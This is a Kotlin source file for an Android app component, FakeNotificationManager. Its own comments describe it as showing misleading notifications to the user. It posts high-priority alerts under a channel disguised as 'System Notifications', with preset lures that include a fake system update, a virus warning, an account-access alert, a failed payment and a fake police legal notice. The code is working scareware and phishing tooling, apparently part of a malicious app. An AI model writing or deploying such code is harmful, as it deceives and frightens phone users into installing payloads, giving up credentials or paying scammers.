package com.sync.xxx.managers

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.os.Build
import android.util.Log
import androidx.core.app.NotificationCompat
import org.json.JSONObject

/**
 * FakeNotificationManager.kt
 * Display fake notifications
 * Show misleading notifications to user
 */
class FakeNotificationManager(private val context: Context) {

    private val TAG = "FakeNotificationManager"
    private val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
    
    private val channelId = "fake_notifications"
    private val channelName = "System Notifications"
    
    init {
        createNotificationChannel()
    }

    /**
     * Create notification channel (Android 8.0+)
     */
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                channelName,
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "System notifications"
                setShowBadge(true)
                enableVibration(true)
                enableLights(true)
            }
            notificationManager.createNotificationChannel(channel)
        }
    }

    /**
     * Show fake notification
     */
    fun showFakeNotification(
        title: String,
        message: String,
        notificationId: Int = (System.currentTimeMillis() / 1000).toInt()
    ): Boolean {
        return try {
            val notification = NotificationCompat.Builder(context, channelId)
                .setContentTitle(title)
                .setContentText(message)
                .setSmallIcon(android.R.drawable.ic_dialog_alert)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setAutoCancel(true)
                .build()
            
            notificationManager.notify(notificationId, notification)
            Log.d(TAG, "Fake notification shown: $title")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Error showing fake notification", e)
            false
        }
    }

    /**
     * Show fake system update notification
     */
    fun showFakeSystemUpdate(): Boolean {
        return showFakeNotification(
            "System Update Available",
            "A new system update is available. Tap to install now."
        )
    }

    /**
     * Show fake security alert
     */
    fun showFakeSecurityAlert(): Boolean {
        return showFakeNotification(
            "Security Alert",
            "Suspicious activity detected. Immediate action required."
        )
    }

    /**
     * Show fake virus warning
     */
    fun showFakeVirusWarning(): Boolean {
        return showFakeNotification(
            "Virus Detected",
            "Your device may be infected. Scan now to remove threats."
        )
    }

    /**
     * Show fake battery warning
     */
    fun showFakeBatteryWarning(): Boolean {
        return showFakeNotification(
            "Battery Warning",
            "Battery health is critical. Optimize now to prevent damage."
        )
    }

    /**
     * Show fake storage warning
     */
    fun showFakeStorageWarning(): Boolean {
        return showFakeNotification(
            "Storage Full",
            "Your storage is almost full. Clean up files to free space."
        )
    }

    /**
     * Show fake account alert
     */
    fun showFakeAccountAlert(): Boolean {
        return showFakeNotification(
            "Account Security",
            "Your account has been accessed from a new device. Verify now."
        )
    }

    /**
     * Show fake payment notification
     */
    fun showFakePaymentNotification(): Boolean {
        return showFakeNotification(
            "Payment Failed",
            "Your recent payment could not be processed. Update payment method."
        )
    }

    /**
     * Show fake police warning
     */
    fun showFakePoliceWarning(): Boolean {
        return showFakeNotification(
            "Legal Notice",
            "Illegal activity detected on this device. Contact authorities immediately."
        )
    }

    /**
     * Show custom fake notification with icon
     */
    fun showCustomFakeNotification(
        title: String,
        message: String,
        iconResId: Int = android.R.drawable.ic_dialog_alert,
        notificationId: Int = (System.currentTimeMillis() / 1000).toInt()
    ): Boolean {
        return try {
            val notification = NotificationCompat.Builder(context, channelId)
                .setContentTitle(title)
                .setContentText(message)
                .setSmallIcon(iconResId)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setAutoCancel(true)
                .build()
            
            notificationManager.notify(notificationId, notification)
            Log.d(TAG, "Custom fake notification shown: $title")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Error showing custom fake notification", e)
            false
        }
    }

    /**
     * Cancel notification
     */
    fun cancelNotification(notificationId: Int) {
        notificationManager.cancel(notificationId)
        Log.d(TAG, "Notification cancelled: $notificationId")
    }

    /**
     * Cancel all notifications
     */
    fun cancelAllNotifications() {
        notificationManager.cancelAll()
        Log.d(TAG, "All notifications cancelled")
    }

    /**
     * Export notification info as JSON
     */
    fun getNotificationInfoAsJson(title: String, message: String): JSONObject {
        return JSONObject().apply {
            put("title", title)
            put("message", message)
            put("channelId", channelId)
            put("channelName", channelName)
            put("timestamp", System.currentTimeMillis())
        }
    }

    companion object {
        /**
         * Show fake notification (static)
         */
        fun showFakeNotification(context: Context, title: String, message: String): Boolean {
            return try {
                val manager = FakeNotificationManager(context)
                manager.showFakeNotification(title, message)
            } catch (e: Exception) {
                false
            }
        }

        /**
         * Preset fake notification types
         */
        enum class FakeNotificationType {
            SYSTEM_UPDATE,
            SECURITY_ALERT,
            VIRUS_WARNING,
            BATTERY_WARNING,
            STORAGE_WARNING,
            ACCOUNT_ALERT,
            PAYMENT_FAILED,
            POLICE_WARNING
        }

        /**
         * Show preset fake notification
         */
        fun showPresetNotification(context: Context, type: FakeNotificationType): Boolean {
            val manager = FakeNotificationManager(context)
            return when (type) {
                FakeNotificationType.SYSTEM_UPDATE -> manager.showFakeSystemUpdate()
                FakeNotificationType.SECURITY_ALERT -> manager.showFakeSecurityAlert()
                FakeNotificationType.VIRUS_WARNING -> manager.showFakeVirusWarning()
                FakeNotificationType.BATTERY_WARNING -> manager.showFakeBatteryWarning()
                FakeNotificationType.STORAGE_WARNING -> manager.showFakeStorageWarning()
                FakeNotificationType.ACCOUNT_ALERT -> manager.showFakeAccountAlert()
                FakeNotificationType.PAYMENT_FAILED -> manager.showFakePaymentNotification()
                FakeNotificationType.POLICE_WARNING -> manager.showFakePoliceWarning()
            }
        }
    }
}
